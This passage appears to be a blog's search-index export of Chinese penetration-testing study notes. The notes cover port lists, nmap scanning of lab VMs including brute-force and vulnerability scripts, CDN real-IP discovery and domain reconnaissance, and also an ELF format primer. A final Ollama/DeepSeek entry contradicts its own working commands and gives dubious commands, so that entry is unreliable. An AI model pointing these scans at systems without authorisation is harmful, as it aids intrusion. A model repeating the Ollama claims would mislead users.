href="https://nsrc.org/workshops/2009/summer/presentations/day3/common-ports.pdf">(Cheat Sheet - Common Ports)</a></p><h2 id="文件共享服务"><a href="#文件共享服务" class="headerlink" title="文件共享服务"></a>文件共享服务</h2><p>21&#x2F;22&#x2F;69：FTP&#x2F;SFTP文件传输协议<br>2049：NFS服务（Network File System）<br>139：Samba服务<br>389：LDAP目录访问协议（Light Directory Access Portocol）</p><h2 id="远程连接服务"><a href="#远程连接服务" class="headerlink" title="远程连接服务"></a>远程连接服务</h2><p>22：SSH远程连接<br>23：Telnet远程连接<br>3389：RDP远程桌面连接<br>5900：VNC远程连接<br>5632：PcAnywhere远程控制服务</p><h2 id="Web应用服务"><a href="#Web应用服务" class="headerlink" title="Web应用服务"></a>Web应用服务</h2><p>80&#x2F;443&#x2F;8080：常见的web服务端口<br>7001&#x2F;7002：Weblogic控制台<br>8080&#x2F;8089：Jboss&#x2F;resin&#x2F;jetty&#x2F;Jenkins</p><p>9090：Websphere控制台<br>4848：Glassfish控制台<br>1352：Lotus domino邮件服务<br>10000：Webmin-web控制面板</p><h2 id="数据库服务"><a href="#数据库服务" class="headerlink" title="数据库服务"></a>数据库服务</h2><p>3306：MySQL<br>1433：MSSQL数据库<br>1521：Oracle数据库<br>5432：PostgreSQL数据库<br>27017&#x2F;27018：MongoDB<br>6379：Redis数据库<br>5000：Sysbase&#x2F;DB2数据库</p><h2 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h2><p>25：SMTP邮件服务<br>110：POP3协议<br>143：IMAP协议</p><h2 id="网络常见协议"><a href="#网络常见协议" class="headerlink" title="网络常见协议"></a>网络常见协议</h2><p>53：DNS域名系统<br>67&#x2F;68：DHCP服务<br>161：SNMP协议</p><h2 id="特殊服务"><a href="#特殊服务" class="headerlink" title="特殊服务"></a>特殊服务</h2><p>2181：Zookeeper服务<br>8069：Zabbix服务<br>9200&#x2F;9300：Elasticsearch服务<br>11211：Memcached服务<br>512&#x2F;513&#x2F;514：Linux Rexec服务<br>873：Rsync服务<br>3690：SVN服务<br>50000：SAP Management Console</p><h1 id="metasploitable2靶机"><a href="#metasploitable2靶机" class="headerlink" title="metasploitable2靶机"></a>metasploitable2靶机</h1><p>链接：<a href="https://pan.baidu.com/s/1u-MTtxATAfhE5ELnhCS-Fg">https://pan.baidu.com/s/1u-MTtxATAfhE5ELnhCS-Fg</a><br>提取码：8888 </p><p>下载、解压、导入VM<br>默认用户名密码 msfadmin&#x2F;msfadmin<br>修改root密码 sudo passwd root<br>ifconfig查看IP</p><h1 id="端口扫描工具NMap（Network-Mapper）"><a href="#端口扫描工具NMap（Network-Mapper）" class="headerlink" title="端口扫描工具NMap（Network Mapper）"></a>端口扫描工具NMap（Network Mapper）</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p><a href="https://nmap.org/">Nmap：网络映射器 - 免费的安全扫描程序</a></p><p>图形界面：zenmap</p><p>主要功能<br>1）扫描主机(Host Discovery)<br>2）扫描端口(Port Scanning)<br>3）探测操作系统、软件版本 (Operating System Detection、Version Detection)</p><h2 id="参数分类"><a href="#参数分类" class="headerlink" title="参数分类"></a>参数分类</h2><p><a href="https://nmap.org/book/man.html">第 15 章.Nmap 参考指南 |Nmap 网络扫描</a></p><p>nmap –help</p><p>TARGET SPECIFICATION:目标，对什么进行扫描，比如是域名、IP或者网络<br>HOST DISCOVERY:主机发现，怎么对主机进行扫描，比如简单扫描，还是全部扫一遍，或者用<br>相应的协议扫<br>SCAN TECHNIQUES:扫描技术，协议的设置<br>PORT SPECIFICATION AND SCAN ORDER:端口和扫描顺序设置<br>SERVICE&#x2F;VERSION DETECTION:服务和版本识别<br>SCRIPT SCAN:使用脚本，nmap本身内置了大量的lua脚本，而且还可以自己编写脚本</p><p>【nmap本身内置了大量的lua脚本，而且还可以自己编写脚本<br>ls &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F; | wc -l<br>全部清单：<a href="https://nmap.org/nsedoc/index.html">https://nmap.org/nsedoc/index.html</a><br>例如：<br>nmap 192.168.142.137 –script http-enum 列举HTTP服务<br>nmap –script&#x3D;auth 绕过鉴权<br>nmap –script&#x3D;brute 暴力破解<br>nmap –script&#x3D;vuln 扫描漏洞】</p><p>OS DETECTION:操作系统识别<br>TIMING AND PERFORMANCE:时间和性能设置，比如扫描频率、重试次数等等<br>FIREWALL&#x2F;IDS EVASION AND SPOOFING:防火墙绕过和欺骗，比如使用代理，假IP等<br>OUTPUT:把扫描接出输出到文件<br>MISC: 杂项：启用IPv6等等配置参数示例</p><h2 id="参数示例"><a href="#参数示例" class="headerlink" title="参数示例"></a>参数示例</h2><p>nmap 192.168.142.133 # metasploitable2 Linux</p><p><a href="http://testfire.net/">http://testfire.net/</a></p><p>nmap testfire.net           # IBM的一个靶场<br>简单扫描：nmap -sP 192.168.142.133<br>指定端口或范围扫描： nmap -p0-65535 192.168.142.133<br>探测操作系统： nmap -O 192.168.142.133</p><p>【cat &#x2F;proc&#x2F;version】</p><p>只进行主机发现，不进行端口扫描： nmap -sn 192.168.40.195&#x2F;24</p><h6 id="IP后面的-24是什么意思？"><a href="#IP后面的-24是什么意思？" class="headerlink" title="IP后面的&#x2F;24是什么意思？"></a>IP后面的&#x2F;24是什么意思？</h6><p>&#x2F;24含义: IP地址后的&#x2F;24表示子网掩码的位数为24位，即255.255.255.0，属于C类IP地址。</p><p>掩码的位数。<br>子网掩码8位，11111111.00000000.00000000.00000000 代表：255.0.0.0（A类IP地址）<br>子网掩码16位，11111111.11111111.00000000.00000000 代表：255.255.0.0（B类IP地址）<br>子网掩码24位，11111111.11111111.11111111.00000000 代表：255.255.255.0（C类IP地址）<br>旁站：和目标网站在同一台服务器但端口不同的其他网站。<br>C段 ：和目标服务器IP处在同一个C段的其它服务器。</p><h2 id="界面工具Zenmap"><a href="#界面工具Zenmap" class="headerlink" title="界面工具Zenmap"></a>界面工具Zenmap</h2><p>第一种：Intense scan<br>第二种：Intense scan plus UDP<br>第三种：Intense scan,all TCP ports<br>第四种：Intense scan,no ping<br>第五种：Ping scan<br>第六种：Quick scan<br>第七种：Quick scan plus<br>第八种：Quick traceroute<br>第九种：Regular scan<br>第十种：Slow comprehensive scan</p><h1 id="其他扫描工具"><a href="#其他扫描工具" class="headerlink" title="其他扫描工具"></a>其他扫描工具</h1><p>masscan、nbtscan<br><a href="http://coolaf.com/tool/port">在线端口检测,端口扫描,端口开放检查-在线工具-postjson</a></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Test </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/17f7e2087847.html"/>
      <url>/2025/06/17f7e2087847.html</url>
      
        <content type="html"><![CDATA[<p>title: IP信息<br>date: 2025-06-28 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="DNS服务器的类型"><a href="#DNS服务器的类型" class="headerlink" title="DNS服务器的类型"></a>DNS服务器的类型</h1><ul><li>本地域名服务器: 在网络适配器中配置的服务器地址，如114.114.114.114或8.8.8.8，可能是路由器地址。</li><li>根域名服务器: 负责全球域名的解析，如.com、.net等顶级域名的管理。</li><li>顶级域名服务器: 解析我们注册的一级域名（实际上是二级域名，因为.com等才是一级域名）。</li><li>授权域名服务器: 解析三级域名（实际上是四级域名），如blog.wuya.com，知道配置记录指向的IP。</li></ul><h2 id="查询方式："><a href="#查询方式：" class="headerlink" title="查询方式："></a>查询方式：</h2><ul><li>迭代查询: 本地域名服务器依次查询根域名服务器、顶级域名服务器、授权域名服务器。</li><li>递归查询: 本地域名服务器帮助查询，层层返回结果。</li></ul><p><img src="/./../../../images/image-20250629130717006.png" alt="image-20250629130717006"></p><h1 id="ping-nslookup"><a href="#ping-nslookup" class="headerlink" title="ping &#x2F; nslookup"></a>ping &#x2F; nslookup</h1><h2 id="Packet-Internet-Groper（因特网包探索器）："><a href="#Packet-Internet-Groper（因特网包探索器）：" class="headerlink" title="Packet Internet Groper（因特网包探索器）："></a>Packet Internet Groper（因特网包探索器）：</h2><p>用于检测网络通畅性，也可根据域名获得服务器IP。</p><h2 id="nslookup工具"><a href="#nslookup工具" class="headerlink" title="nslookup工具:"></a>nslookup工具:</h2><p>也可用于查询域名对应的IP，可指定查询类型，如MX记录（邮件交换记录）。</p><p>nslookup -type&#x3D;”MX” baidu.com</p><h1 id="IP归属信息"><a href="#IP归属信息" class="headerlink" title="IP归属信息"></a>IP归属信息</h1><p><a href="http://ipwhois.cnnic.net.cn/">http://ipwhois.cnnic.net.cn/</a></p><p><a href="https://www.ip38.com/">iP地址查询 - iP38查询网</a></p><p>进行IP归属查询，可查询IPv4&#x2F;IPv6地址、AS号码、网络名称等信息。</p><p>运营商：显示为”China Mobile Communications Corporation”，即中国移动</p><p>IP段范围：</p><p>地理位置：</p><p>管理联系人：</p><h1 id="如何获取CDN背后的真实IP"><a href="#如何获取CDN背后的真实IP" class="headerlink" title="如何获取CDN背后的真实IP"></a>如何获取CDN背后的真实IP</h1><h2 id="CDN-Content-Delivery-Network-内容分发网络"><a href="#CDN-Content-Delivery-Network-内容分发网络" class="headerlink" title="CDN(Content Delivery Network)内容分发网络"></a>CDN(Content Delivery Network)内容分发网络</h2><h4 id="使用CDN服务-将相同内容部署在多台服务器上，形成源站-多个节点服务器的架构。"><a href="#使用CDN服务-将相同内容部署在多台服务器上，形成源站-多个节点服务器的架构。" class="headerlink" title="使用CDN服务 :将相同内容部署在多台服务器上，形成源站+多个节点服务器的架构。"></a>使用CDN服务 :将相同内容部署在多台服务器上，形成源站+多个节点服务器的架构。</h4><p>优势：</p><ul><li>负载均衡：分摊访问请求，减少单台服务器压力</li><li>加速访问：用户访问最近的节点服务器，缩短物理距离，提升响应速度（如武汉用户访问武汉服务器比北京服务器更快）</li><li>应用案例：淘宝早期就采用CDN技术处理商品图片等静态内容</li></ul><h2 id="实现流程（以阿里云为例）"><a href="#实现流程（以阿里云为例）" class="headerlink" title="实现流程（以阿里云为例）"></a>实现流程（以阿里云为例）</h2><p><a href="https://www.zhihu.com/question/36514327/answer/1604554133">https://www.zhihu.com/question/36514327/answer/1604554133</a></p><ol><li>当终端用户（北京）向<a href="http://www.a.com下的指定资源发起请求时,首先/">www.a.com下的指定资源发起请求时，首先</a><br>向LDNS（本地DNS）发起域名解析请求。</li><li>LDNS检查缓存中是否有<a href="http://www.a.com的ip地址记录.如果有,则直/">www.a.com的IP地址记录。如果有，则直</a><br>接返回给终端用户；如果没有，则向授权DNS查询。</li><li>当授权DNS解析<a href="http://www.a.com时,返回域名cname/">www.a.com时，返回域名CNAME</a><br><a href="http://www.a.tbcdn.com对应ip地址./">www.a.tbcdn.com对应IP地址。</a></li><li>域名解析请求发送至阿里云DNS调度系统，并为请求分配最佳节点<br>IP地址。</li><li>LDNS获取DNS返回的解析IP地址。</li><li>用户获取解析IP地址。</li><li>用户向获取的IP地址发起对该资源的访问请求。</li></ol><h2 id="如何找出真实IP"><a href="#如何找出真实IP" class="headerlink" title="如何找出真实IP"></a>如何找出真实IP</h2><p><img src="/./../../../images/image-20250629133105891.png" alt="image-20250629133105891"></p><p>CDN会隐藏真实服务器IP，需要通过特殊技术手段获取</p><h3 id="1、超级ping"><a href="#1、超级ping" class="headerlink" title="1、超级ping"></a>1、超级ping</h3><h3 id="2、历史DNS"><a href="#2、历史DNS" class="headerlink" title="2、历史DNS"></a>2、历史DNS</h3><p><a href="https://tools.ipip.net/cdn.php">全球 CDN 服务商查询_专业精准的IP库服务商_IPIP</a></p><p><a href="https://sitereport.netcraft.com/">该网站正在运行什么？|网络工艺</a></p><h3 id="3、通过子域名查询IP"><a href="#3、通过子域名查询IP" class="headerlink" title="3、通过子域名查询IP"></a>3、通过子域名查询IP</h3><h3 id="4、国外主机解析"><a href="#4、国外主机解析" class="headerlink" title="4、国外主机解析"></a>4、国外主机解析</h3><p>原理：部分网站未部署海外CDN节点，国外访问可能直连源站</p><p>工具：</p><ul><li><a href="https://www.webpagetest.org/">WebPageTest - 网站性能和优化测试</a></li><li><a href="https://dnscheck.pingdom.com/">网站速度测试 |Pingdom 工具</a></li><li><a href="https://www.host-tracker.com/en">网站正常运行时间监控服务，检查网站是否关闭 - Host-tracker</a></li></ul><h3 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h3>]]></content>
      
      
      <categories>
          
          <category> Penetration Test </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>域名信息收集</title>
      <link href="/2025/06/a2f5477bcf25.html"/>
      <url>/2025/06/a2f5477bcf25.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-域名是什么"><a href="#1-域名是什么" class="headerlink" title="1.域名是什么?"></a>1.域名是什么?</h1><p>用来代替IP，找到网络上的一台计算机</p><p><img src="/./../../../images/image-20250628152826187.png" alt="image-20250628152826187"></p><h1 id="2-域名的分类："><a href="#2-域名的分类：" class="headerlink" title="2.域名的分类："></a>2.域名的分类：</h1><h3 id="国际域名"><a href="#国际域名" class="headerlink" title="国际域名:"></a>国际域名:</h3><p>.com(商业公司);.net(网络服务);.org(组织协会等);.gov(政府部);.edu(教育机构);.mil(军事领域);.int(国际组织)</p><h3 id="国别域名"><a href="#国别域名" class="headerlink" title="国别域名:"></a>国别域名:</h3><p>.CN代表中国，.UK代表英国，.US代表美国</p><h3 id="新顶级域名"><a href="#新顶级域名" class="headerlink" title="新顶级域名:"></a>新顶级域名:</h3><p>biz,info，name，pro，aero,coop, museum..</p><h1 id="3-域名联系人信息"><a href="#3-域名联系人信息" class="headerlink" title="3.域名联系人信息"></a>3.域名联系人信息</h1><p>所属人、邮箱、电话、地址…..</p><p><a href="https://site.ip138.com/dbcha.com/domain.htm">dbcha.com子域名大全 dbcha.com二级域名 dbcha.com域名解析查询</a></p><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p>.com由域名运营商VeriSign 管理</p><p>cn域名由CNNIC 管理</p><h4 id="whois工具"><a href="#whois工具" class="headerlink" title="whois工具"></a>whois工具</h4><p><a href="https://whois.chinaz.com/">https://whois.chinaz.com</a><br><a href="http://whoissoft.com/">http://whoissoft.com</a><br><a href="https://whois.cnnic.cn/WelcomeServlet">https://whois.cnnic.cn/WelcomeServlet</a><br>kali whois命令</p><p><img src="/./../../../images/image-20250629091525995.png" alt="image-20250629091525995"></p><h3 id="域名反查"><a href="#域名反查" class="headerlink" title="域名反查"></a>域名反查</h3><p><a href="http://whois.chinaz.com/reverse">http://whois.chinaz.com/reverse</a></p><h3 id="ICP备案查询"><a href="#ICP备案查询" class="headerlink" title="ICP备案查询"></a>ICP备案查询</h3><h3 id="企业信息查询"><a href="#企业信息查询" class="headerlink" title="企业信息查询"></a>企业信息查询</h3><p>官方渠道：beian.miit.gov.cn</p><p>工具：天眼查、企查查等</p><p>查询方式：输入单位名称&#x2F;域名&#x2F;备案号</p><p>备案号规则：个人唯一，多个网站使用”-1”,”-2”等后缀</p><h1 id="4-子域名信息"><a href="#4-子域名信息" class="headerlink" title="4.子域名信息"></a>4.子域名信息</h1><h3 id="子域名的作用"><a href="#子域名的作用" class="headerlink" title="子域名的作用"></a>子域名的作用</h3><h4 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h4><p>子域名是主域名下的二级域名，格式为”子域名.主域名”，如news.baidu.com</p><h4 id="作用原理："><a href="#作用原理：" class="headerlink" title="作用原理："></a>作用原理：</h4><p>·资源隔离：可将不同服务部署在不同服务器（如news.baidu.com和map.baidu.com指向不同IP）</p><p>·品牌统一：保持同一品牌下的多产品线（如百度新闻、百度地图）</p><p>·零成本扩展：无需额外注册新域名，理论上子域名数量无限制</p><h4 id="对比方案："><a href="#对比方案：" class="headerlink" title="对比方案："></a>对比方案：</h4><p>·子目录方案：如<a href="http://www.baidu.com/news%EF%BC%88%E6%89%80%E6%9C%89%E6%9C%8D%E5%8A%A1%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%EF%BC%8C%E6%80%A7%E8%83%BD%E5%8F%97%E9%99%90%EF%BC%89">www.baidu.com/news（所有服务共享服务器资源，性能受限）</a></p><p>·独立域名方案：如bdnews.com（注册管理成本高）</p><h3 id="怎么查询子域名？"><a href="#怎么查询子域名？" class="headerlink" title="怎么查询子域名？"></a>怎么查询子域名？</h3><h4 id="1、字典猜解："><a href="#1、字典猜解：" class="headerlink" title="1、字典猜解："></a>1、字典猜解：</h4><p>使用常见子名字典（如oa、crm、bbs等前缀）</p><h4 id="2、暴力枚举："><a href="#2、暴力枚举：" class="headerlink" title="2、暴力枚举："></a>2、暴力枚举：</h4><p>从a-z、0-9组合尝试（1位→多位）</p><h4 id="3、技术实现："><a href="#3、技术实现：" class="headerlink" title="3、技术实现："></a>3、技术实现：</h4><p>·端口探测：默认扫描80(http)和443(https)端口</p><p>·状态检测：通过HTTP响应码判断服务可用性（200&#x2F;302为有效）</p><p><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><h1 id="5-域名DNS信息"><a href="#5-域名DNS信息" class="headerlink" title="5.域名DNS信息"></a>5.域名DNS信息</h1><h3 id="1-域名与IP"><a href="#1-域名与IP" class="headerlink" title="1. 域名与IP"></a>1. 域名与IP</h3><h4 id="DNS本质："><a href="#DNS本质：" class="headerlink" title="DNS本质："></a>DNS本质：</h4><p>DNS(Domain Name Server)是将域名映射为IP地址的解析服务，本质是一个记录域名与IP映射关系的分布式数据库。</p><h4 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h4><p>当用户访问域名时，DNS服务会查询其数据库中的映射表，将域名转换为对应的IP地址。</p><h3 id="2-域名解析信息"><a href="#2-域名解析信息" class="headerlink" title="2. 域名解析信息"></a>2. 域名解析信息</h3><h4 id="配置流程："><a href="#配置流程：" class="headerlink" title="配置流程："></a>配置流程：</h4><p>在域名注册商处设置DNS服务器（如DNSPod）</p><p>在DNS服务平台配置具体解析规则</p><p><img src="/./../../../images/image-20250629100748277.png" alt="image-20250629100748277"></p><h4 id="配置示例："><a href="#配置示例：" class="headerlink" title="配置示例："></a>配置示例：</h4><p>@符号代表所有地址</p><p>www代表特定子域名</p><p>一个域名可配置多条不同类型记录</p><h4 id="记录类型"><a href="#记录类型" class="headerlink" title="记录类型"></a>记录类型</h4><p>A记录：是最常用类型，将域名指向一个IPv4地址，如8.8.8.8<br>CNAME：别名记录，将域名指向另一个域名地址，与其保持相同解析(如z.cn跳转到amazon.cn)</p><p>MX：用于邮件服务器，相关参数一般由邮件注册商提供，企业邮箱服务(如腾讯企业邮mxdomain.qq.com）</p><p>TXT：可填写附加文本信息，常用于域名验证<br>NS(name serve)：域名服务器记录，可将指定域名交由其他DNS服务商解析管理(如f1g1ns1.dnspod.net)</p><p>AAAA：将域名指向一个IPv6地址(如ff06:0:0:0:0:0:0:c3)</p><p><a href="https://www.strerr.com/cn/nslookup.html">DNS域名在线查询 - www.strerr.com</a></p><p><a href="https://sitereport.netcraft.com/">该网站正在运行什么？|网络工艺</a></p><p><a href="http://www.jsons.cn/nslookup/">在线域名解析记录检测-在线Nslookup域名解析查询工具</a></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Test </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件格式</title>
      <link href="/2025/06/d6d094e5785a.html"/>
      <url>/2025/06/d6d094e5785a.html</url>
      
        <content type="html"><![CDATA[<h1 id="ELF文件类型"><a href="#ELF文件类型" class="headerlink" title="ELF文件类型"></a>ELF文件类型</h1><p>1.可执行文件（Executable File）[.exec]:经过链接的、可执行的目标文件，通常也称为程序。</p><p>2.可重定位文件（Relocatable File）（可重定位目标文件）[.rel]:由源代码编译生成，包含编译后的二进制代码和数据，但未完成链接过程，通常以”.o”作为扩展名。</p><p>3.共享目标文件（Shared Object file）[.dyn]:动态链接库文件。可被多个程序共享使用，在运行时加载到内存。</p><h1 id="ELF-文件结构"><a href="#ELF-文件结构" class="headerlink" title="ELF 文件结构"></a>ELF 文件结构</h1><p>ELF 文件通过特定的格式组织数据，主要结构包括：</p><h4 id="1-ELF-文件头（ELF-Header）"><a href="#1-ELF-文件头（ELF-Header）" class="headerlink" title="1. ELF 文件头（ELF Header）"></a><strong>1. ELF 文件头（ELF Header）</strong></h4><ul><li>位于文件起始位置，描述文件的基本属性。</li><li>关键字段：<ul><li><strong>EI_MAGIC</strong>：文件魔数（如<code>0x7F ELF</code>），用于标识 ELF 格式。[7f 45 4c 46即字符串“\177ELF“]</li><li><strong>EI_CLASS</strong>：位数（32 位或 64 位）。</li><li><strong>EI_DATA</strong>：字节序（大端或小端）。</li><li><strong>e_type</strong>：文件类型（可执行文件、共享库等）。</li><li><strong>e_entry</strong>：程序入口地址。</li></ul></li></ul><h4 id="2-程序头表-段表（Program-Header-Table）"><a href="#2-程序头表-段表（Program-Header-Table）" class="headerlink" title="2. 程序头表&#x2F;段表（Program Header Table）"></a><strong>2. 程序头表&#x2F;段表（Program Header Table）</strong></h4><ul><li>描述文件在内存中的布局，用于加载器将文件映射到内存。</li><li>关键字段：<ul><li><strong>p_type</strong>：段类型（如代码段、数据段、动态链接段）。</li><li><strong>p_vaddr</strong>：内存虚拟地址。</li><li><strong>p_filesz</strong>：文件中占用的大小。</li><li><strong>p_memsz</strong>：内存中占用的大小。</li></ul></li></ul><h4 id="3-节头表（Section-Header-Table）"><a href="#3-节头表（Section-Header-Table）" class="headerlink" title="3. 节头表（Section Header Table）"></a><strong>3. 节头表（Section Header Table）</strong></h4><ul><li>描述文件中的各个 “节”（Section），用于链接器处理目标文件。</li><li>常见节类型：<ul><li><strong>.text</strong>：可执行代码段。</li><li><strong>.data</strong>：已初始化的全局变量和静态变量。</li><li><strong>.bss</strong>：未初始化的全局变量和静态变量（运行时自动初始化为 0）。</li><li><strong>.rodata</strong>：只读数据段（如字符串常量）。</li><li><strong>.symtab</strong>：符号表，记录函数和变量的名称、地址等。</li><li><strong>.strtab</strong>：字符串表，存储符号表中的字符串内容。</li></ul></li></ul><h4 id="4-节（Sections）"><a href="#4-节（Sections）" class="headerlink" title="4. 节（Sections）"></a><strong>4. 节（Sections）</strong></h4><ul><li>具体存储代码、数据、元信息的区域，不同类型的 ELF 文件包含的节不同。</li><li>示例：<ul><li>可执行文件：包含<code>.text</code>、<code>.data</code>、<code>.dynamic</code>（动态链接信息）等。</li><li>目标文件：包含<code>.text</code>、<code>.rel.text</code>（代码重定位信息）等。</li></ul></li></ul><p><img src="/./../../../../../images/image-20250629223418086.png" alt="image-20250629223418086"></p><p><img src="/./../../../../../images/image-20250629223515561.png" alt="image-20250629223515561"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 1-二进制文件 </category>
          
          <category> 2-ELF文件格式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/a0cca283eeaf.html"/>
      <url>/2025/06/a0cca283eeaf.html</url>
      
        <content type="html"><![CDATA[<p>title: 信息收集概览<br>date: 2025-06-28 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="渗透测试的流程"><a href="#渗透测试的流程" class="headerlink" title="渗透测试的流程"></a>渗透测试的流程</h1><h2 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h2><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h2><h3 id="信息收集包括内容"><a href="#信息收集包括内容" class="headerlink" title="信息收集包括内容"></a>信息收集包括内容</h3><h3 id="收集范围："><a href="#收集范围：" class="headerlink" title="收集范围："></a>收集范围：</h3><p>域名信息、IP段、开放的端口、网站架构、文件目录结构、软件版本、WAF、旁站、C段…</p><h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>1.域名相关信息</p><p>2.IP相关信息</p><p>3.端口服务相关信息</p><p>4.指纹识别（CMS&#x2F;CDF&#x2F;WAF）</p><p>5.Google Hacking</p><p>6.目录信息</p><p>7.Git Hack</p>]]></content>
      
      
      <categories>
          
          <category> Penetration Test </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>r1_8b</title>
      <link href="/2025/06/38d795f72413.html"/>
      <url>/2025/06/38d795f72413.html</url>
      
        <content type="html"><![CDATA[<p>系统变量，对系统的所有账户生效，您可以根据情况自己选。点击添加添加，输入变量名OLLAMA_MODELS，变量值输入您放置ollama模型的新地址，我这里放在了E:\ollama\models</p><p><img src="/images/254E7FA0-46F1-4144-B913-C7C3E82AFEBA.png"></p><p><img src="/images/E5D4D6BF-5C2F-450B-BF73-B2076752FB89.png"></p><ol><li>拉取模型</li></ol><blockquote><p>ollama pull deepseek-r1:8b</p></blockquote><ol start="2"><li>运行模型</li></ol><blockquote><p>ollama run deepseek-r1:8b</p></blockquote><h3 id="🔍-Can-I-run-DeepSeek-R1-8B-via-Ollama"><a href="#🔍-Can-I-run-DeepSeek-R1-8B-via-Ollama" class="headerlink" title="🔍 Can I run DeepSeek-R1:8B via Ollama?"></a>🔍 Can I run DeepSeek-R1:8B via Ollama?</h3><p>Currently, <strong>Ollama does not officially support the DeepSeek-R1 8B model</strong> unless it has been added to their<br>repository or community-supported list. You should check:</p><ul><li>The <a href="https://ollama.com/models">Ollama models page</a> for updates.</li><li>Community forums (e.g., GitHub issues) if users have shared custom Docker images&#x2F;definitions.</li></ul><hr><h3 id="🧪-How-to-run-transformer-models-like-DeepSeek-R1-via-Ollama"><a href="#🧪-How-to-run-transformer-models-like-DeepSeek-R1-via-Ollama" class="headerlink" title="🧪 How to run transformer models like DeepSeek-R1 via Ollama"></a>🧪 How to run transformer models like DeepSeek-R1 via Ollama</h3><p>If the model is supported, you can use this command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:8b</span><br></pre></td></tr></table></figure><p>This will:</p><ul><li>Download (if not installed) and load the 8B parameter version of DeepSeek-R1.</li><li>Start a local instance for interactive chat or API access.</li></ul><hr><h3 id="🤔-What-is-DeepSeek-R1-8B"><a href="#🤔-What-is-DeepSeek-R1-8B" class="headerlink" title="🤔 What is DeepSeek-R1:8B?"></a>🤔 What is DeepSeek-R1:8B?</h3><p>DeepSeek-R1 is an advanced transformer language model developed by <a href="https://www.deepseek.com/">深度求索（DeepSeek）</a>. The “8B” refers to <strong>8 billion parameters</strong> in the model. It’s designed for:</p><ul><li>Natural language understanding and generation.</li><li>Code-related tasks (syntax, debugging).</li><li>Knowledge answering.</li><li>Creative writing.</li></ul><hr><h3 id="📄-Example-usage-with-Ollama-CLI"><a href="#📄-Example-usage-with-Ollama-CLI" class="headerlink" title="📄 Example usage with Ollama CLI"></a>📄 Example usage with Ollama CLI</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Start interactive chat (if supported)</span></span><br><span class="line">ollama chat deepseek-r1:8b</span><br><span class="line"></span><br><span class="line"><span class="comment"># Or generate text via API/command line:</span></span><br><span class="line">curl http://localhost:11434/api/generate \</span><br><span class="line">  -X POST \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;model&quot;: &quot;deepseek-r1:8b&quot;,</span></span><br><span class="line"><span class="string">    &quot;prompt&quot;: &quot;Explain quantum computing in simple terms.&quot;,</span></span><br><span class="line"><span class="string">    &quot;stream&quot;: false</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure><hr><h3 id="⚠️-If-the-model-isn’t-supported-yet"><a href="#⚠️-If-the-model-isn’t-supported-yet" class="headerlink" title="⚠️ If the model isn’t supported yet:"></a>⚠️ If the model isn’t supported yet:</h3><p>You can try running it via Docker (if you have technical access):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name deepseek-r1 \</span><br><span class="line">  -p 11434:11434 \</span><br><span class="line">  --<span class="built_in">rm</span> \</span><br><span class="line">  -v ollama_models:/models \</span><br><span class="line">  llamafile/docker-ollama \</span><br><span class="line">  predict DeepSeek-R1 /models/deepseek-r1.tar</span><br></pre></td></tr></table></figure><p>But note: This may not be officially maintained.</p><hr><h3 id="🌟-What-else-can-Ollama-run"><a href="#🌟-What-else-can-Ollama-run" class="headerlink" title="🌟 What else can Ollama run?"></a>🌟 What else can Ollama run?</h3><p>Oll (a) supports models like:</p><ul><li>Llama, Mistral, Mixtral</li><li>GPT models (via LMSYS)</li><li>Gemma, Phi, CodeLlama</li><li>And many others!</li></ul><p>Check the <a href="https://ollama.com/models">current list on their 